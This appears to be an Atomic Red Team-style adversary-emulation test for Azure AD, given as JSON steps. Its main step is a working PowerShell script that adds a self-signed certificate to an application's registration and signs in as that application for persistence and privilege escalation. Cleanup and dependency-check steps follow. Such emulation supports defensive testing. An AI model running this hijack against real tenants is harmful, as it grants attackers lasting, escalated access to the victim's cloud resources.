{
  "id": "a12b5531-acab-4618-a470-0dafb294a87a",
  "name": "Azure AD Application Hijacking - App Registration",
  "description": "Add a certificate to an Application through its App Registration. The certificate can then be used to authenticate as the application.\nThis can be used for persistence, and also for privilege escalation by benefiting from the Application's rights.\nAn account with high-enough Azure AD privileges is needed, such as Global Administrator or Application Administrator. The account authentication must be without MFA.\n",
  "platforms": [
    "azure-ad"
  ],
  "steps": [
    {
      "id": "b9bf00e1-3312-537f-ab6f-3c2c2f7a3e08",
      "type": "execute-command",
      "data": {
        "command": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential \u003e $null\n\n$app = Get-AzureADApplication -SearchString \"#{application_name}\" | Select-Object -First 1\nif ($app -eq $null) { Write-Warning \"Application not found\"; exit }\n\n# in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long\n$credNotAfter = (Get-Date).AddDays(1)\n$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry\n\n$cert = New-SelfSignedCertificate -DnsName \"atomicredteam.example.com\" -FriendlyName \"AtomicCert\" -CertStoreLocation Cert:\\CurrentUser\\My -KeyExportPolicy Exportable -Provider \"Microsoft Enhanced RSA and AES Cryptographic Provider\" -NotAfter $certNotAfter\n$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())\nWrite-Host \"Generated certificate \"\"$($cert.Thumbprint)\"\"\"\n\nNew-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \"AtomicTest\" -Usage Verify -Value $keyValue -EndDate $credNotAfter\n\nStart-Sleep -s 30\n$tenant = Get-AzureADTenantDetail\n$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $app.AppId -CertificateThumbprint $cert.Thumbprint\nWrite-Host \"Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\"\nWrite-Host \"End of Hijacking\"",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "1308110b-0fb1-5384-8aef-c1e2dfd08ccd",
      "type": "execute-command",
      "data": {
        "command": "Import-Module -Name AzureAD -ErrorAction Ignore\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential -ErrorAction Ignore \u003e $null\n\n$app = Get-AzureADApplication -SearchString \"#{application_name}\" | Select-Object -First 1\n$credz = Get-AzureADApplicationKeyCredential -ObjectId $app.ObjectId\nforeach ($cred in $credz) {\n  if ([System.Text.Encoding]::ASCII.GetString($cred.CustomKeyIdentifier) -eq \"AtomicTest\") {\n    Write-Host \"Removed $($cred.KeyId) key from application\"\n    Remove-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -KeyId $cred.KeyId\n  }  \n}\nGet-ChildItem -Path Cert:\\CurrentUser\\My | where { $_.FriendlyName -eq \"AtomicCert\" } | Remove-Item",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "653fec79-d5a5-51b2-adcd-921a50cf09f5",
      "name": "Check dependency 1/1",
      "description": "AzureAD module must be installed.\n",
      "type": "execute-command",
      "data": {
        "command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "1fa9d886-4e7b-5fde-9622-fecd2533f775",
      "name": "Resolve dependency 1/1",
      "description": "AzureAD module must be installed.\n",
      "type": "execute-command",
      "data": {
        "command": "Install-Module -Name AzureAD -Force",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "653fec79-d5a5-51b2-adcd-921a50cf09f5",
      "name": "Re-check dependency 1/1",
      "description": "AzureAD module must be installed.\n",
      "type": "execute-command",
      "data": {
        "command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}",
        "command_type": "powershell"
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "b9bf00e1-3312-537f-ab6f-3c2c2f7a3e08",
      "p": "on-success",
      "o": "1308110b-0fb1-5384-8aef-c1e2dfd08ccd"
    },
    {
      "s": "b9bf00e1-3312-537f-ab6f-3c2c2f7a3e08",
      "p": "on-failure",
      "o": "1308110b-0fb1-5384-8aef-c1e2dfd08ccd"
    },
    {
      "s": "653fec79-d5a5-51b2-adcd-921a50cf09f5",
      "p": "on-success",
      "o": "b9bf00e1-3312-537f-ab6f-3c2c2f7a3e08"
    },
    {
      "s": "653fec79-d5a5-51b2-adcd-921a50cf09f5",
      "p": "on-failure",
      "o": "1fa9d886-4e7b-5fde-9622-fecd2533f775"
    },
    {
      "s": "1fa9d886-4e7b-5fde-9622-fecd2533f775",
      "p": "on-success",
      "o": "653fec79-d5a5-51b2-adcd-921a50cf09f5"
    },
    {
      "s": "653fec79-d5a5-51b2-adcd-921a50cf09f5",
      "p": "on-failure",
      "o": "b9bf00e1-3312-537f-ab6f-3c2c2f7a3e08"
    }
  ],
  "tags": [
    "T1098",
    "T1098.001"
  ],
  "input_arguments": [
    {
      "name": "application_name",
      "type": "string",
      "description": "Name of the targeted application",
      "value": "SuperApp"
    },
    {
      "name": "password",
      "type": "string",
      "description": "Azure AD password",
      "value": "p4sswd"
    },
    {
      "name": "username",
      "type": "string",
      "description": "Azure AD username",
      "value": "jonh@contoso.com"
    }
  ]
}